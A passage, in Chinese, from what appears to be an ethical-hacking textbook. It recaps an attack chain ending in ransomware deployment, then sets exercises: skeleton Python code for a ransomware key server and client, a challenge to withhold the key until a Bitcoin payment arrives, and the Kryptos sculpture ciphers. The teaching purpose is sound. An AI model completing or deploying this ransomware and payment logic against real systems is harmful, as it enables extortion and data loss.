现在，一个咖啡店的攻击者如何通过上传这种加密勒索软件到公司的系统来勒索公司呢？在第二章中，我们讨论了攻击者如何使用 ARP 欺骗攻击拦截目标的 Web 流量。在第三章中，你学到了攻击者如何使用 Wireshark 提取目标访问的服务器 IP 地址，在第四章中，我们看到攻击者如何使用`nmap`扫描服务器并发现运行在 21 端口的易受攻击的 FTP 应用程序。我们还看到攻击者如何利用 FTP 应用程序上传自定义的反向 Shell。然后，攻击者可以使用这个反向 Shell 将自己的加密勒索软件上传到 Web 服务器。在第七章和第八章中，我们将讨论如果攻击者在服务器上找不到其他漏洞时，可能使用的技术。

### 练习

尝试以下练习以加深你对加密和勒索软件的理解。在第一个练习中，你将编写一个勒索软件服务器，解密对称密钥并将其返回给客户端。在第二个练习中，你将扩展客户端，使其将加密的密钥副本发送到服务器。在最后一个练习中，你将探索位于弗吉尼亚州兰利中央情报局总部前 Kryptos 雕像上的已解决和未解决的代码。

#### *勒索软件服务器*

实现一个与勒索软件客户端通信的服务器。你的服务器应该能够处理多个客户端连接。一旦客户端连接到服务器，客户端将发送一个加密的对称密钥到服务器。服务器应该使用其私钥解密该密钥，然后将其发送回客户端：

```
import socketserver

class ClientHandler(socketserver.BaseRequestHandler):

  ➊ def handle(self):

        encrypted_key = self.request.recv(1024).strip()

        print ("Implement decryption of data " + encrypted_key )

        #------------------------------------

        #      Decryption Code Here

        #------------------------------------

        self.request.sendall("send key back")
if __name__ == "__main__":

    HOST, PORT = "", 8000

  ➋ tcpServer =  socketserver.TCPServer((HOST, PORT), ClientHandler)

     try:

      ➌ tcpServer.serve_forever()

    except:

        print("There was an error")
```

我们开始实现将解密对称密钥并将其发送回客户端的功能 ➊。作为练习，尝试修改该函数，使其解密密钥并将其发送回客户端。提示：阅读 pyca/`cryptography`库文档中的 RSA 解密部分，地址是*[`cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa.html`](https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa.html)*。记住，使用私钥之前需要加载它。

接下来，我们创建一个新的 TCP 服务器实例 ➋，然后启动服务器 ➌。这是你在第四章中使用的相同 TCP 服务器代码。

作为附加挑战，尝试扩展勒索软件服务器，在发送解密密钥之前检查是否已收到比特币付款。

#### *扩展勒索软件客户端*

扩展你在本章中构建的勒索软件客户端，加入接收解密后的对称密钥后解密文件的功能。这个客户端需要将加密的对称密钥副本发送到你在上一个练习中构建的勒索软件服务器，并读取服务器返回的解密后的对称密钥。然后，它需要使用解密后的对称密钥解密它之前加密的文件。

```
   import socket

                    ...

   def sendEncryptedKey(eKeyFilePath):

    ➊ with socket.create_connection((hostname, port)) as sock:

          with open(eKeyFilePath, "rb") as file:

           ➋ pass

➌ def decryptFile(filePath, key):

       pass
```

我们创建一个新的套接字并打开密钥文件 ➊。然后，你需要实现发送密钥文件并等待解密结果的代码 ➋。当你收到解密后的密钥时，将其传递给`decryptFile()`函数 ➌。

请注意，这个函数没有代码：我将留给你实现解密函数，使其使用`Fernet`模块恢复文件。提示：阅读*[`cryptography.io/en/latest/`](https://cryptography.io/en/latest/)*以获得如何操作的提示。

#### *未解决的代码*

有几个密码仍未解开，包括在中央情报局总部前的 Kryptos 雕像上写的著名密码。雕像包含四个加密信息，其中三个已经解开。前两个密码是使用凯撒密码的扩展——*维吉尼亚密码*加密的。第三个密码是使用一种叫做*换位法*的技术加密的。

然而，没人能解开第四个密码。创建雕像的艺术家吉姆·桑博恩（Jim Sanborn）提供了四个线索，见表 5-2。试着自己解开前三个密码。第一个密码是使用维吉尼亚密码加密的，密钥是：Kryptos, Palimpsest。如果你使用这个密钥和维吉尼亚表格，你将能够解码它。然后，如果你足够勇敢，可以尝试解开第四个未解的密码。

**表 5-2：** 吉姆·桑博恩提供的四个线索

| 位置 | 密文 | 明文 |
| --- | --- | --- |
| 第 64 至 69 位字母 | “NYPVTT” | “BERLIN” |
| 第 70 至 74 位 | “MZFPK” | “CLOCK” |
| 第 26 至 34 位 | “EFGHIJL0H” | “NORTHEAST” |
| 第 22 至 25 位 | “FLRV” | “EAST” |

以下是四个加密信息的表现形式：

```
EMUFPHZLRFAXYUSDJKZLDKRNSHGNFIVJ    ABCDEFGHIJKLMNOPQRSTUVWXYZABCD
YQTQUXQBQVYUVLLTREVJYQTMKYRDMFD     AKRYPTOSABCDEFGHIJLMNQUVWXZKRYP
VFPJUDEEHZWETZYVGWHKKQETGFQJNCE     BRYPTOSABCDEFGHIJLMNQUVWXZKRYPT
GGWHKK?DQMCPFQZDQMMIAGPFXHQRLG      CYPTOSABCDEFGHIJLMNQUVWXZKRYPTO
TIMVMZJANQLVKQEDAGDVFRPJUNGEUNA     DPTOSABCDEFGHIJLMNQUVWXZKRYPTOS
QZGZLECGYUXUEENJTBJLBQCRTBJDFHRR    ETOSABCDEFGHIJLMNQUVWXZKRYPTOSA
YIZETKZEMVDUFKSJHKFWHKUWQLSZFTI     FOSABCDEFGHIJLMNQUVWXZKRYPTOSAB
HHDDDUVH?DWKBFUFPWNTDFIYCUQZERE     GSABCDEFGHIJLMNQUVWXZKRYPTOSABC
EVLDKFEZMOQQJLTTUGSYQPFEUNLAVIDX    HABCDEFGHIJLMNQUVWXZKRYPTOSABCD
FLGGTEZ?FKZBSFDQVGOGIPUFXHHDRKF     IBCDEFGHIJLMNQUVWXZKRYPTOSABCDE
FHQNTGPUAECNUVPDJMQCLQUMUNEDFQ      JCDEFGHIJLMNQUVWXZKRYPTOSABCDEF
ELZZVRRGKFFVOEEXBDMVPNFQXEZLGRE     KDEFGHIJLMNQUVWXZKRYPTOSABCDEFG
DNQFMPNZGLFLPMRJQYALMGNUVPDXVKP     LEFGHIJLMNQUVWXZKRYPTOSABCDEFGH
DQUMEBEDMHDAFMJGZNUPLGEWJLLAETG     MFGHIJLMNQUVWXZKRYPTOSABCDEFGHI

ENDYAHROHNLSRHEOCPTEOIBIDYSHNAIA    NGHIJLMNQUVWXZKRYPTOSABCDEFGHIJL
CHTNREYULDSLLSLLNOHSNOSMRWXMNE      OHIJLMNQUVWXZKRYPTOSABCDEFGHIJL
TPRNGATIHNRARPESLNNELEBLPIIACAE     PIJLMNQUVWXZKRYPTOSABCDEFGHIJLM
WMTWNDITEENRAHCTENEUDRETNHAEOE      QJLMNQUVWXZKRYPTOSABCDEFGHIJLMN
TFOLSEDTIWENHAEIOYTEYQHEENCTAYCR    RLMNQUVWXZKRYPTOSABCDEFGHIJLMNQ
EIFTBRSPAMHHEWENATAMATEGYEERLB      SMNQUVWXZKRYPTOSABCDEFGHIJLMNQU
TEEFOASFIOTUETUAEOTOARMAEERTNRTI    TNQUVWXZKRYPTOSABCDEFGHIJLMNQUV
BSEDDNIAAHTTMSTEWPIEROAGRIEWFEB     UQUVWXZKRYPTOSABCDEFGHIJLMNQUVW
AECTDDHILCEIHSITEGOEAOSDDRYDLORIT   VUVWXZKRYPTOSABCDEFGHIJLMNQUVWX
RKLMLEHAGTDHARDPNEOHMGFMFEUHE       WVWXZKRYPTOSABCDEFGHIJLMNQUVWXZ
ECDMRIPFEIMEHNLSSTTRTVDOHW?OBKR     XWXZKRYPTOSABCDEFGHIJLMNQUVWXZK
UOXOGHULBSOLIFBBWFLRVQQPRNGKSSO     YXZKRYPTOSABCDEFGHIJLMNQUVWXZKR
TWTQSJQSSEKZZWATJKLUDIAWINFBNYP     ZZKRYPTOSABCDEFGHIJLMNQUVWXZKRY
VTTMZFPKWGDKZXTJCDIGKUHUAUEKCAR      ABCDEFGHIJKLMNOPQRSTUVWXYZABCD
```
